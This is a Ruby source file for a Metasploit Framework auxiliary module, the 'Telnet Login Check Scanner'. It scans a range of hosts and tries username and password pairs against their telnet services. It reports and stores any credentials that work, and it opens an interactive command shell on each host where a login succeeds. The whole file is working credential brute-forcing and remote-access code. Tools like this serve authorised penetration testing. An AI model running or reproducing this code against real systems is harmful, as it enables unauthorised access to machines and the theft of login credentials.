##
# $Id$
##

##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/framework/
##

require 'msf/core'
require 'msf/base/sessions/command_shell_options'

#
# Ghetto
#
module CRLFLineEndings
	def put(str)
		return super if not str
		super(str.strip + "\r\n")
	end
end

class Metasploit3 < Msf::Auxiliary

	include Msf::Exploit::Remote::Telnet
	include Msf::Auxiliary::Report
	include Msf::Auxiliary::AuthBrute

	include Msf::Auxiliary::Scanner

	include Msf::Sessions::CommandShellOptions

	def initialize
		super(
			'Name'        => 'Telnet Login Check Scanner',
			#'Version'     => '$Revision$',
			'Description' => %q{
				This module will test a telnet login on a range of machines and
				report successful logins.  If you have loaded a database plugin
				and connected to a database this module will record successful
				logins and hosts so you can track your access.
			},
			'Author'      => 'egypt',
			'License'     => MSF_LICENSE
		)
		deregister_options('RHOST')
		register_options(
			[
				OptBool.new('VERBOSE', [ true, 'Verbose output', false])
			], Msf::Exploit::Remote::Telnet
		)
		register_advanced_options(
			[
				OptInt.new('TIMEOUT', [ true, 'Default timeout for telnet connections. The greatest value of TelnetTimeout, TelnetBannerTimeout, or this option will be used as an overall timeout.', 0])
			], self.class
		)

		@no_pass_prompt = []
	end

	attr_accessor :no_pass_prompt
	attr_accessor :password_only

	def run_host(ip)
		overall_timeout ||= [
			datastore['TIMEOUT'].to_i,
			datastore['TelnetBannerTimeout'].to_i,
			datastore['TelnetTimeout'].to_i
		].sort.last

		self.password_only = []

		begin
			each_user_pass do |user, pass|
				userpass_sleep_interval unless self.credentials_tried.empty?
				Timeout.timeout(overall_timeout) do
					try_user_pass(user, pass)
				end
			end
		rescue ::Rex::ConnectionError, ::EOFError, ::Timeout::Error
			return
		end
	end

	def try_user_pass(user, pass)
		this_cred = [user,rhost,rport].join(":")
		if self.credentials_tried[this_cred] == pass || self.credentials_good[this_cred]  || self.no_pass_prompt.include?(this_cred)
			return :tried
		else
			self.credentials_tried[this_cred] = pass
		end
		print_status "#{rhost}:#{rport} Telnet - Attempting: '#{user}':'#{pass}'" if datastore['VERBOSE']

		ret = do_login(user,pass)
		if ret == :no_pass_prompt
			print_status "#{rhost}:#{rport} Telnet - Skipping '#{user}':'#{pass}' due to missing password prompt" if datastore['VERBOSE']
			self.no_pass_prompt << this_cred
		else
			start_telnet_session(rhost,rport,user,pass) if login_succeeded?
		end
	end

	# Making this serial since the @attempts counting business is causing
	# all kinds of syncing problems.
	def do_login(user,pass)

		connect

		begin

		print_status("#{rhost}:#{rport} Banner: #{@recvd.gsub(/[\r\n\e\b\a]/, ' ')}") if datastore['VERBOSE']

		if login_succeeded?
			report_telnet('','',@trace)
			return :no_auth_required
		end

		# Immediate password prompt... try our password!
		if password_prompt?
			user = ''

			if password_only.include?(pass)
				print_status("#{rhost}:#{rport} only asks for a password that we already tried: '#{pass}'")
				return :tried
			end

			print_status("#{rhost}:#{rport} only asks for a password, trying #{pass}")
			password_only << pass
		else
			send_user(user)
		end

		# Allow for slow echos
		1.upto(10) do
			recv_telnet(self.sock, 0.10)
		end

		print_status("#{rhost}:#{rport} Prompt: #{@recvd.gsub(/[\r\n\e\b\a]/, ' ')}") if datastore['VERBOSE']

		if password_prompt?
			send_pass(pass)

			# Allow for slow echos
			1.upto(10) do
				recv_telnet(self.sock, 0.10)
			end


			print_status("#{rhost}:#{rport} Result: #{@recvd.gsub(/[\r\n\e\b\a]/, ' ')}") if datastore['VERBOSE']

			if login_succeeded?
				report_telnet(user,pass,@trace)
				return :success
			else
				disconnect
				return :fail
			end
		else
			if login_succeeded? && @recvd !~ /^#{user}\x0d*\x0a/
				report_telnet(user,pass,@trace)
				return :no_pass_required
			else
				disconnect
				return :no_pass_prompt
			end
		end

		rescue ::Interrupt
			raise $!
		rescue ::Exception => e
			print_error("#{rhost}:#{rport} Error: #{e.class} #{e} #{e.backtrace}")
		end

	end

	def report_telnet(user,pass,proof)
		this_cred = [user,rhost,rport].join(":")
		print_good("#{rhost} - SUCCESSFUL LOGIN #{user} : #{pass}")
		self.credentials_good[this_cred] = pass
		report_auth_info(
			:host	=> rhost,
			:proto	=> 'telnet',
			:user	=> user,
			:pass	=> pass,
			:targ_host	=> rhost,
			:targ_port	=> datastore['RPORT'],
			:proof  => proof
		)
	end

	def start_telnet_session(host,port,user,pass)
		# Windows telnet server requires \r\n line endings and it doesn't
		# seem to affect anything else.
		sock.extend(CRLFLineEndings)
		sess = Msf::Sessions::CommandShell.new(sock)
		sess.set_from_exploit(self)
		sess.info = "TELNET #{user}:#{pass} (#{host}:#{port})"
		framework.sessions.register(sess)
		sess.process_autoruns(datastore)
	end

end
